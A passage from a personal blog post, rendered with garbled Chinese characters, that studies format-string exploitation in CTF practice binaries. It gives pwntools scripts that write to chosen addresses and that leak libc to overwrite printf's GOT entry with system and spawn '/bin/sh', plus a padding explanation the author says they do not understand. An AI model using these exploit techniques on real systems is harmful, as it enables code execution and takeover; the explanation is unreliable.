<p>ğŸ§© ç¤ºä¾‹ 2ï¼šå†™å…¥å¤šä¸ªåœ°å€ï¼ˆå¦‚ <code>a=16</code>, <code>b=2</code>, <code>c=0x12345678</code>ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./vuln&quot;)</span><br><span class="line">offset = 8</span><br><span class="line">a_addr = elf.symbols[&#x27;a&#x27;]</span><br><span class="line">b_addr = elf.symbols[&#x27;b&#x27;]</span><br><span class="line">c_addr = elf.symbols[&#x27;c&#x27;]</span><br><span class="line"></span><br><span class="line"># æ„é€  payloadï¼šå†™å…¥å¤šä¸ªåœ°å€</span><br><span class="line">writes = &#123;</span><br><span class="line">    a_addr: 16,</span><br><span class="line">    b_addr: 2,</span><br><span class="line">    c_addr: 0x12345678</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, writes, write_size=&#x27;int&#x27;)</span><br><span class="line">p = process(&quot;./vuln&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h3 id="fmt-demoï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç»¼åˆåˆ©ç”¨ï¼‰"><a href="#fmt-demoï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç»¼åˆåˆ©ç”¨ï¼‰" class="headerlink" title="fmt_demoï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç»¼åˆåˆ©ç”¨ï¼‰"></a>fmt_demoï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç»¼åˆåˆ©ç”¨ï¼‰</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721203303330.png"  alt="image-20250721203303330"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721212854956.png"  alt="image-20250721212854956"></p>
<p>å¯ä»¥å…ˆæ³„éœ²libcçš„åŸºå€ï¼Œå¾—åˆ°systemå‡½æ•°çš„åœ°å€</p>
<p>å†æ ¹æ®æ­¤æŠŠprintfçš„gotè¡¨å­˜å‚¨çš„åœ°å€æ¢ä¸ºsystemå‡½æ•°çš„åœ°å€</p>
<p>ä¹‹åè¾“å…¥å‚æ•°â€œ&#x2F;bin&#x2F;shâ€,å°±å¯ä»¥å®ç°</p>
<h4 id="è„šæœ¬-4"><a href="#è„šæœ¬-4" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p=process(&quot;./fmt_demo&quot;)</span><br><span class="line">elf=ELF(&quot;./fmt_demo&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">payload=p32(read_got)+b&quot;%4$s&quot;</span><br><span class="line">p.send(payload.ljust(0x100,b&quot;\x00&quot;))</span><br><span class="line">read=u32(p.recv(8)[4:])</span><br><span class="line">print(hex(read))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&quot;read&quot;,read)</span><br><span class="line">libc_base=read-libc.dump(&quot;read&quot;)</span><br><span class="line">system=libc_base+libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(offset=4,writes=&#123;elf.got[&quot;printf&quot;]:system&#125;)</span><br><span class="line">p.sendline(payload.ljust(0x100,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">bin=b&quot;/bin/sh&quot;</span><br><span class="line">p.sendline(bin.ljust(0x100,b&quot;\x00&quot;))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>









<blockquote>
<p><strong>é‚£ä¸ºä»€ä¹ˆè¿˜è¦å¡«è¡¥ payload çš„é•¿åº¦ä¸º 0x100 å­—èŠ‚ï¼Ÿâ€</strong></p>
</blockquote>
<p>æˆ‘ä»¬æ¥ä» <strong>â€œpayload è¢«å¤åˆ¶åˆ°æ ˆä¸Šâ€</strong> è¿™ä¸ªç°è±¡å‡ºå‘ï¼Œè§£é‡Šä¸ºä»€ä¹ˆæˆ‘ä»¬<strong>æœ‰æ„åœ°</strong> å°† payload å¡«å……åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100 å­—èŠ‚ï¼‰ï¼Œå°½ç®¡å®ƒå¯èƒ½ä¼šè¢«å¤åˆ¶åˆ°æ ˆä¸Šã€‚</p>
<p>âœ… ç®€çŸ­å›ç­”ï¼š</p>
<blockquote>
<p><strong>æˆ‘ä»¬å¡«è¡¥ payload åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100 å­—èŠ‚ï¼‰ï¼Œæ˜¯ä¸ºäº†è®© payload è¢«å®Œæ•´å¤åˆ¶åˆ°æ ˆä¸Šï¼Œä»è€Œè®©åç§»å›ºå®šã€å¸ƒå±€å¯æ§ï¼Œä¾¿äºåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›è¡Œåœ°å€æ³„éœ²æˆ–å†™å…¥æ“ä½œã€‚</strong> </p>
</blockquote>
<p>ğŸ“Œ payload çš„ä¸¤ç§â€œå‘½è¿â€ï¼š</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1ï¸âƒ£ payload çŸ­</td>
<td>&lt; ä¸€äº›å‚æ•°é•¿åº¦</td>
<td><code>printf</code>ä»æ ˆä¸Šè¯»å–å‚æ•°</td>
<td>payload åœ¨ buf ä¸­ï¼Œå‚æ•°åœ¨æ ˆä¸Š</td>
</tr>
<tr>
<td>2ï¸âƒ£ payload é•¿</td>
<td>&gt; ä¸€å®šé•¿åº¦ï¼ˆå¦‚ 100 å­—èŠ‚ï¼‰</td>
<td><code>printf</code>æŠŠ payload å¤åˆ¶åˆ°æ ˆä¸Š</td>
<td>payload æœ¬èº«å°±åœ¨æ ˆä¸Š</td>
</tr>
</tbody></table>
<p>ğŸ§© ä¸ºä»€ä¹ˆè¦â€œæ•…æ„â€è®© payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šï¼Ÿ</p>
<p>âœ… ä¼˜ç‚¹ä¸€ï¼š<strong>åç§»å›ºå®šï¼Œä¾¿äºè°ƒè¯•</strong></p>
<ul>
<li>payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šåï¼Œå®ƒåœ¨æ ˆä¸Šçš„ä½ç½®æ˜¯å›ºå®šçš„ã€‚</li>
<li>æˆ‘ä»¬å¯ä»¥ç²¾å‡†æ§åˆ¶åç§»ï¼ˆæ¯”å¦‚ <code>%4$s</code> å°±ä¸€å®šè¯»å– payload ä¸­çš„åœ°å€ï¼‰ã€‚</li>
<li>é¿å…äº†å›  payload é•¿åº¦ä¸åŒå¯¼è‡´åç§»å˜åŒ–çš„é—®é¢˜ã€‚</li>
</ul>
<p>âœ… ä¼˜ç‚¹äºŒï¼š<strong>ä¾¿äºæ„é€ å†™å…¥æ“ä½œï¼ˆå¦‚ %nï¼‰</strong></p>
<ul>
<li>å½“æˆ‘ä»¬æƒ³ç”¨ <code>%n</code> å†™æŸä¸ªåœ°å€æ—¶ï¼Œéœ€è¦ç¡®ä¿åœ°å€åœ¨æ ˆä¸Šï¼Œä¸”åç§»å›ºå®šã€‚</li>
<li>å¦‚æœ payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠåœ°å€æ”¾åœ¨ payload å¼€å¤´ï¼Œç„¶åç”¨ <code>%1$n</code> ç²¾å‡†å†™å…¥ã€‚</li>
</ul>
<p>âœ… ä¼˜ç‚¹ä¸‰ï¼š<strong>é˜²æ­¢ payload è¢«æˆªæ–­æˆ–åç§»æ¼‚ç§»</strong></p>
<ul>
<li>å¦‚æœ payload é•¿åº¦ä¸å›ºå®šï¼Œå¯èƒ½å¯¼è‡´åç§»å˜åŒ–ï¼Œ<code>%s</code>ã€<code>%n</code> è¯»å†™é”™è¯¯åœ°å€ã€‚</li>
<li>å¡«å……åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100ï¼‰å¯ä»¥é¿å…è¿™ç§æ¼‚ç§»ã€‚</li>
</ul>
<p>:grey_question:ä½†æˆ‘å…¶å®ä¸å¤ªç†è§£   </p>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pwn-study/">pwn_study</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2025/07/22/ciscn-2019-sw-1/"
                                   title="ciscn_2019_sw_1"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">ciscn_2019_sw_1</span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2025/07/20/HarekazeCTF2019-baby-rop2/"
                                   title="ret2libc-printf"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">ret2libc-printf</span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
    
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">zach0ry</a>
        
    </div>

    <div class="theme-info info-item">
        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    

    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        

        <!-- PC go comment -->
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    

    <!-- tablet toc -->
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->


<!-- lazyload -->


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
